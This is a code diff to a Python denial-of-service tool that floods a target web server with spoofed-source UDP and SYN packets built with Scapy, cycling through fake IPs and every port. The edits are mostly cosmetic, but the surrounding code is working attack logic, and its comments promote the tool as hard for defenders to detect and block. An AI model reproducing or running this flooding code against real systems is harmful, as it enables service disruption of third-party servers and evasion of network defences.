@@ -18,9 +18,9 @@
 ## Used this program at your own risk.
 
 # Multiple IP multiple port
-# A python script that conduct DOS Attack by sending large number of packets to web
+# A python script that conduct DDOS Attack by sending large number of packets to web
 # server using multiple IPs and from multiple ports. This type of DOS attack offers a little bit diffecult challange
-# for security defender to detect and blocj it 
+# for security defender to detect and block it 
 
 import os, sys, time, socket, random, hashlib, threading
 
@@ -98,10 +98,7 @@ Author: {line}{frColor}evilfeonix{STOP}     Version: {frColor}{line}v[1.0]{STOP}
 
 def fake_ip():
     return fake.ipv4()
-
-def fakeScript(srcP,srcIP,dstP,dstIP,dstDomain,payload):
-   pass
-
+   
 def UDPflood(srcP,srcIP,dstP,dstIP,dstDomain,payload):
    ip = IP(src = srcIP, dst = dstIP)
    udp = UDP(sport = srcP, dport = dstP)
@@ -112,7 +109,6 @@ def UDPflood(srcP,srcIP,dstP,dstIP,dstDomain,payload):
       pkt = ip/udp/raw
       send(pkt, verbose=False)
    except Exception as a:
-      print(f"{err} Error While Sending Packet!")
       print(f"{err} {a}.{STOP}")
       red_Flag.set()
       return
@@ -127,7 +123,6 @@ def SYNflood(srcP,srcIP,dstP,dstIP,dstDomain,payload):
       pkt = ip/tcp/raw
       send(pkt, verbose=False)
    except Exception as a:
-      print(f"{err} Error While Sending Packet!")
       print(f"{err} {a}.{STOP}")
       red_Flag.set()
       return
@@ -139,8 +134,8 @@ def domain2IP(host):
       hostip = gethostbyname(host)
    except socket.gaierror:
       slow(f'')
-      slow(f'   {err} Failed to Resolve Domain: {host}')
-      slow(f'   {err} Please Check your Internet Connection{STOP}\n')
+      slow(f'   {err} Failed to Resolve Domain: {host}...{STOP}')
+      slow(f'   {err} Please Check your Internet Connection.{STOP}\n')
       os.sys.exit()
    except Exception as a:
       slow(f'')
@@ -161,7 +156,6 @@ def endAttack(idx,dstP,dstIP,dstHost,dstDomain,duration,atty):
    slow(f"""===========================================================
      {frColor}Target Port: {dstP} {STOP}                      
      {frColor}Target IP: {dstIP} {STOP}                       
-     {frColor}Target Host: {dstHost}{STOP}                  
      {frColor}Target Domain: {dstDomain}{STOP}                  
      {frColor}Packate Sent: {idx}  {STOP}                     
      {frColor}Durations: {duration}{STOP}                     
@@ -276,6 +270,9 @@ def startAttack(target,dstP,atty,payload):
    try:
       for spoofedP in range(1, 65535):
          if red_Flag.is_set():
+            print(f"{note} Try Running the Program with Full Privillage")
+            print(f"   sudo python3 {sys.argv[0]}")
+            print(f"{note} Also Check Your Network Connection!{STOP}\n")
             os.sys.exit()
 
          spoofedIP = fake_ip()      # spoofed IP Address
@@ -415,7 +412,6 @@ def main():
 fake = Faker()
 red_Flag = threading.Event()
 UserAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
     "Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
     "Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0",
@@ -437,8 +433,4 @@ if __name__ == "__main__":
       time.sleep(2)
       slow(f"")
       os.sys.exit()
-         
-#   Its implementation in Python can be done
-# with the help of Scapy. The following Python
-# script helps implement Multiple IPs multiple
-# port DoS attack −
+      
